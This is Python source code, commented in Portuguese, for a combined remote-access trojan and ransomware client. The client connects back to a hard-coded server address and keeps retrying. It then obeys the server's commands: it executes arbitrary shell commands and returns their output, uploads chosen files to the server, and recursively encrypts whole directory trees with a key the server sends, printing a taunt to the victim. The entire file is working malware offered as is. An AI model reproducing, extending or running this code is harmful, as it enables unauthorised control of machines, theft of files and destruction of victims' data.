import socket
import selectors
import sys
import time
import subprocess
import os
from cryptography.fernet import Fernet

_HOST = '192.168.8.185'
_PORT = 9991
_MAX_MSG_SIZE = 4096

_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else _PORT

def conn_server(sel, soc):
    sel = selectors.DefaultSelector()
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # soc.connect_ex((_HOST, _PORT))
    # sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)
    while True:
        try:
            print('{}Tentando conectar ao servidor em {}{}:{}...{}'.format(cores['red'], cores['blue'], _HOST, _PORT, cores['limpa']))

            soc.connect((_HOST, _PORT))
            soc.setblocking(False)
            print('{}Conectado ao Servidor!{}'.format(cores['green'], cores['limpa']))
            break
        except socket.error as erro:
            print(str(erro))
            print('{}Tentando novamente em {}10{} segundos...{}'.format(cores['red'], cores['green'], cores['red'], cores['limpa']))
            time.sleep(10)
    sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)
    return sel, soc

def discover(initial_path):
    '''
    Caminha recursivamente à partir do caminho inicial,
    onde os arquivos deverão ser descobertos e listados
    para depois serem encryptados.

    Parameters:
        initial_path (str): Caminho inicial que será
        usado para criptografar os arquivos.

    Returns:
        @abs_path (str): O caminho caminho de cada arquivo que é
        encontrado enquanto navega pelos subdiretórios.
    '''
    white_list = ['exe,', 'dll', 'so', 'vmlinuz', 'img']

    for dirpath, _, files in os.walk(initial_path):
        for _file in files:
            abs_path = os.path.abspath(os.path.join(dirpath, _file))
            ext = abs_path.split('.')[-1]
            if ext not in white_list:
                yield abs_path

def crypt_file(filename, key, action='encrypt'):
    '''
    Criptografa/descriptografa o arquivo dependendo da ação informada.

    Parameters:
        filename (str): Nome do arquivo que será criptografado.
        key (str): Chave de criptografia.
        action (str): Ação para criptografar ou descriptografar o arquivo.
    '''
    cipher_value = None
    with open(filename, 'rb') as _file:
        content = _file.read()
        if action == 'encrypt':
            cipher_value = Fernet(key).encrypt(content)
        elif action == 'decrypt':
            cipher_value = Fernet(key).decrypt(content)
        else:
            return

    with open(filename, 'wb') as _file:
        _file.write(cipher_value)


if __name__ == "__main__":
    sel = None
    soc = None
    key = None
    mask = None
    events = None

    send_file = None

    cores = {
        'limpa':'\033[m',
        'red':'\033[31m',
        'green':'\033[32m',
        'blue':'\033[34m'
    }

    # Iniciando o nosso seletor padrão e Configurando o Socket
    #sel = selectors.DefaultSelector()
    #soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #soc.setblocking(False)
    #soc.connect_ex((_HOST, _PORT))
    #sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)

    sel, soc = conn_server(sel, soc)
    while True:
        try:
            events = sel.select()

            for key, mask in events:
                # Recebendo oque foi enviado
                if mask & selectors.EVENT_READ:
                    try:
                        entry = key.fileobj.recv(_MAX_MSG_SIZE)
                        entry = entry.decode()



                        # Se não receber nada, fecha a conexão
                        if not entry:
                            print('{}Conexão com o servidor fechada...{}'.format(cores['red'], cores['limpa']))
                            #exit()
                            a = (3/0)
                            break



                        # Tratando se for msg
                        if entry[:3] == 'msg':
                            print('{}Servidor > {}{}{}'.format(cores['red'], cores['green'], entry[3:], cores['limpa']))
                            # soc.send(('Mensagem Recebida! >>> {}'.format(entry[3:])).encode())



                        # Tratando se for Comando
                        elif entry[:3] == 'cmd':
                            # Reconhece o cmd copiar
                            if entry[3:6] == 'cpy':
                                caminho_arq = os.path.join(os.getcwd(), entry[6:len(entry)-1])
                                send_file = [open(caminho_arq, 'rb'), os.path.getsize(caminho_arq), True]
                                print('{}Começando o envio do arquivo > {}{}{}'.format(cores['red'], cores['green'], entry[6:len(entry)-1], cores['limpa']))



                            # Retorna a pasta em que estamos
                            elif entry[3:] == 'cd':
                                soc.send(os.getcwd().encode())
                                continue



                            # Aqui ele navega nas pastas como se fosse o cliente
                            elif entry[3:5] == 'cd':
                                os.chdir(entry[6:len(entry)-1])
                                soc.send((os.getcwd()).encode())



                            # Criptografa os arquivos do caminho especificado com a chave informada
                            elif entry[3:7] == 'cryp':
                                path, key = entry[7:].split(':')
                                crypt_path = os.path.abspath(os.path.join(os.getcwd(), path))
                                print('{}Começando a criptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))

                                for filename in discover(crypt_path):
                                    try:
                                        crypt_file(filename, key, 'encrypt')
                                    except:
                                        continue
                                print('{}Se quiser ver seus dados novamente, comece a rezar!{}'.format(cores['red'], cores['limpa']))



                            # Descriptografa os arquivos do caminho especificado com a chave informada
                            elif entry[3:8] == 'dcryp':
                                path, key = entry[8:].split(':')
                                crypt_path = os.path.abspath(os.path.join(os.getcwd(), path))
                                print('{}Começando a descriptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))

                                for filename in discover(crypt_path):
                                    try:
                                        crypt_file(filename, key, 'decrypt')
                                    except:
                                        continue
                                print('{}Arquivos descriptografados > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))



                            # Aqui ele trata tudo que sobrou como um comando
                            elif len(entry) > 0:
                                saida = subprocess.getoutput(entry[3:])
                                soc.sendall(saida.encode())
                    except:
                        # print('Error: Modulo de comandos!')
                        soc.send('Error: Comando não identificado!'.encode())


                # Se o sistema estiver pronto para gravar ou enviar arquivos
                elif mask & selectors.EVENT_WRITE:
                    if send_file:
                        if send_file[2]:
                            print('{}Enviando tamanho > {}{}{}'.format(cores['red'], cores['green'], send_file[1], cores['limpa']))
                            key.fileobj.send('FIL{}'.format(send_file[1]).encode())
                            #Etime.sleep(1e-9)
                            send_file[2] = False

                        # Se o tamanho do arq for maior que 0
                        elif send_file[1] > 0:
                            # Se o tamanho for maior que 512
                            if send_file[1] > 512:
                                #print('Enviando pedaço ... 512')
                                data = send_file[0].read(512)
                                m = 'FIL{:03d}'.format(len(data)).encode()
                                m = m + data
                                key.fileobj.send(m)
                                #time.sleep(1e-9)
                                # Removendo o pedaço enviado do tamanho do vetor
                                send_file[1] = send_file[1] - 512

                            # se for menor envia direto
                            else:
                                #print('Enviando pedaço ... {}'.format(send_file[1]))
                                data = send_file[0].read(send_file[1])
                                m = 'FIL{:03d}'.format(len(data)).encode()
                                m = m + data
                                key.fileobj.send(m)
                                #time.sleep(1e-9)
                                send_file[1] = 0

                            if send_file[1] == 0:
                                send_file[0].close()
                                print('{}Sistema > {}Arquivo Enviado!{}'.format(cores['red'], cores['green'], cores['limpa']))

            #print("[{}] {}".format(key.fileobj, entry))
            #soc.send(entry.encode())

        except:
            sel.unregister(soc)
            soc.close()
            sel, soc = conn_server(sel,soc)

